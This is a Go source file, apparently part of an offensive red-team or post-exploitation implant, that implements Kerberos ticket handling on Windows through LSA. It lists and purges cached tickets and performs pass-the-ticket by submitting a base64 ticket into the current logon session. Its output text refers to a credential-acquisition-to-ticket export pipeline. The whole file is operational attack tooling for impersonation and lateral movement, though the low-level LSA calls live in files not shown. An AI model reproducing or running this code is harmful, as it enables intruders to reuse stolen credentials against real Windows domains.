//go:build windows

package services

import (
	"fmt"
	"strings"
)

// runKerberosAction Windows 实现：list / purge / ptt 全部走 LSA
// （调用与结构体见 lsa_windows.go / lsa_types.go）。
func runKerberosAction(act kerberosAction) ([]byte, error) {
	switch act.Kind {
	case kerberosActionList:
		return kerberosListText()

	case kerberosActionPurge:
		if err := lsaPurgeTicket(act.Arg); err != nil {
			return nil, fmt.Errorf("purge 失败: %w", err)
		}
		if act.Arg == "" {
			return []byte("[+] 已请求清空当前登录会话的全部 LSA 票据"), nil
		}
		return []byte(fmt.Sprintf("[+] 已请求清除票据: %s", act.Arg)), nil

	case kerberosActionPTT:
		if err := lsaSubmitTicket(act.Blob); err != nil {
			return nil, fmt.Errorf("ptt 失败: %w", err)
		}
		return []byte(fmt.Sprintf("[+] 已提交票据（%d 字节）；可用 `kerberos list` 确认", len(act.Blob))), nil

	default:
		return nil, fmt.Errorf("未知动作: %s", act.Kind)
	}
}

// kerberosListText 把缓存里的票据渲染成控制台文本
func kerberosListText() ([]byte, error) {
	tickets, err := lsaListTickets()
	if err != nil {
		return nil, err
	}
	if len(tickets) == 0 {
		return []byte("[+] LSA 票据缓存为空（当前登录会话没有 Kerberos 票据）"), nil
	}

	var b strings.Builder
	fmt.Fprintf(&b, "[+] LSA 票据缓存：%d 张\n", len(tickets))
	for _, t := range tickets {
		client := t.Client
		if t.ClientRealm != "" && !strings.Contains(client, "@") {
			client += "@" + t.ClientRealm
		}
		fmt.Fprintf(&b, "  %-32s %-28s %s → %s  flags=0x%08x\n",
			t.Server, client, lsaTicketTime(t.Start), lsaTicketTime(t.End), t.Flags)
	}
	b.WriteString("  导出制品: 凭据获取 → ticket → lsa；导入: kerberos ptt <base64>\n")
	return []byte(b.String()), nil
}
